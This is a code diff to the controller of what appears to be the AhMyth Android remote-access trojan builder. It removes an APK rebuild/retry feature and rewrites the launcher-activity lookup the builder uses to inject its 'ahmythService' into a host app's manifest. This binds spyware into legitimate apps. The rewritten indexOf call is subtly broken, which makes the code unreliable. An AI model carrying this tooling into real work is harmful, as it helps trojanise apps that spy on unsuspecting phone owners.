@@ -102,7 +102,7 @@ app.controller("AppCtrl", ($scope) => {
         else if (status == CONSTANTS.logStatus.FAIL)
             fontColor = CONSTANTS.logColors.RED;
         else if (status == CONSTANTS.logStatus.INFO)
-            fontColor = CONSTANTS.logColors.YELLOW; 
+            fontColor = CONSTANTS.logColors.YELLOW;
 
         $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
         log.scrollTop = log.scrollHeight;
@@ -196,52 +196,7 @@ app.controller("AppCtrl", ($scope) => {
             });
     }
 
-    // function rebuild the decompiled apk folder
-    $appCtrl.RebuildApk = (apkFolder) => {
 
-    appCtrl.Log('Building ' + filePath + apkFolder + '...');
-    var RebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-        (error, stdout, stderr) => {
-            if (error !== null) {
-                $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
-                return;
-            }
-
-            $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
-            var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-                (error, stdout, stderr) => {
-                    if (error !== null) {
-                        $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
-                        return;
-                    }
-
-
-                    fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
-                        if (err) throw err;
-
-                        $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                        $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
-                        exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
-                    });
-                });
-        });
-    }
-
-    $appCtrl.Retry = (folder) => {
-      if (folder == -1) {
-        return;
-      }
-      
-      // generate a solid ahmyth apk
-      var filePath = $appCtrl.filePath;
-      if (filePath == null) {
-        $appCtrl.Log("Browse the apk folder which you want to rebuild", CONSTANTS.logStatus.FAIL);
-        return;
-      } else if (!filePath.includes(".*")) {
-        $appCtrl.Log("It is not a decompiled APK folder", CONSTANTS.logStatus.FAIL);
-        return;
-      }
-    }
 
     // function to build the apk and sign it
     $appCtrl.GenerateApk = (apkFolder) => {
@@ -2869,7 +2824,7 @@ app.controller("AppCtrl", ($scope) => {
                 }
                 })
         })
-        appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
+        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
         var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
             (error, stdout, stderr) => {
                 if (error !== null) {
@@ -5564,12 +5519,11 @@ app.controller("AppCtrl", ($scope) => {
 
             var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
             if (launcherPath == -1) {
-                $appCtrl.Log("Cannot find the launcher activity,", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("Please check the app by running", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("aapt d badging 'path-to-your.apk' | grep launchable-activity", CONSTANTS.logStatus.INFO)
+                $appCtrl.Log("Cannot find the launcher activity, please run the command", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("aapt d badging path-to-your.apk | grep launchable-activity", CONSTANTS.logStatus.INFO)
+                $appCtrl.Log("to make sure that launcher activity is present in the APK.", CONSTANTS.logStatus.FAIL);
                 return;
-              }
-            
+            }
 
             var ahmythService = CONSTANTS.ahmythService;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
@@ -5711,13 +5665,22 @@ function GetLauncherPath(manifest, smaliPath) {
         indices.push(result.index);
     }
 
-    var indexOfLauncher = manifest.indexOf('<category android:name="android.intent.category.LAUNCHER" />'); 
+    var indexOfLauncher = manifest.indexOf
+   (
+    'intent-filter',
+    '"android.intent.action.MAIN"',
+    '"android.intent.category.DEFAULT"'
+    +
+    'intent-filter',
+    '"android.intent.action.MAIN"',
+    '"android.intent.category.INFO"'
+    +
+    'intent-filter',
+    '"android.intent.action.MAIN"',
+    '"android.intent.category.LAUNCHER"'
+    );
     var indexOfActivity = -1;
-    if (indexOfLauncher != -1) {
-        var indexOfLauncher = manifest.indexOf('<category android:name="android.intent.category.INFO" />');
-        var indexOfActivity = -1
-    }
-
+    
     if (indexOfLauncher != -1) {
         manifest = manifest.substring(0, indexOfLauncher);
         for (var i = indices.length - 1; i >= 0; i--) {
@@ -5759,6 +5722,3 @@ function GetLauncherPath(manifest, smaliPath) {
 
   // new function to build and sign and apk from a decompiled folder state 
   // only to be fired when the user clicks the Retry button in the APK Builder page
-  
-  // targets the apk folder select with the dialog
-  // and then build the apk
